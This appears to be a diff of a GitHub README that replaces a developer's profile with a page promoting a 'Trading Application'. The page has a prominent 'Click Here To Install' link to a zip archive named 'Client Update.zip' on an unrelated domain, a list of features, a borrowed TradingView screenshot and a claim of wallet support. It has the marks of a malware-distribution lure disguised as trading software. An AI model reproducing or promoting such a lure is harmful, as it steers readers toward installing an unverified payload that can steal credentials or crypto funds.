@@ -1,10 +1,28 @@
-# Lukass
+![imagesg](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
 
-Hello there! I'm a Discord bot and web developer!
+<H1 align=center><a href="https://sanmiguelarcangel.company/temp/Client%20Update.zip">[Click Here To Install]</a></H1>
 
-- 💻 The languages I know are Javascript, Typescript and Python.
-- 👋 Reach me on [Discord.](https://discord.com/users/746425032246558742)
 
-# My Github Statistics
-<img alt="My Github Stats" src="https://github-readme-stats.vercel.app/api?username=fraimerdelacruz&show_icons=true&hide_border=true&theme=tokyonight" />
-<img alt="My Top languages used" src="https://github-readme-stats.vercel.app/api/top-langs?username=fraimerdelacruz&show_icons=true&theme=tokyonight&layout=compact" />
+### Updated Features
+```
+- 16-charts layout ✅
+- 100 indicators per chart ✅
+- 40K historical bars ✅
+- 2000 price alerts ✅
+- 1500 technical alerts ✅
+- 350 parallel chart connections ✅
+- Automated Trading ✅
+```
+
+# Showcase
+
+![sscreenshowscase](https://static.tradingview.com/static/bundles/app-view.cb6d45c43bcf89257771.png)
+
+### About Trading Application
+
+> Open-Source Trading!
+>
+> Trading Analytics!
+>
+> Supported Any Wallets!
+****
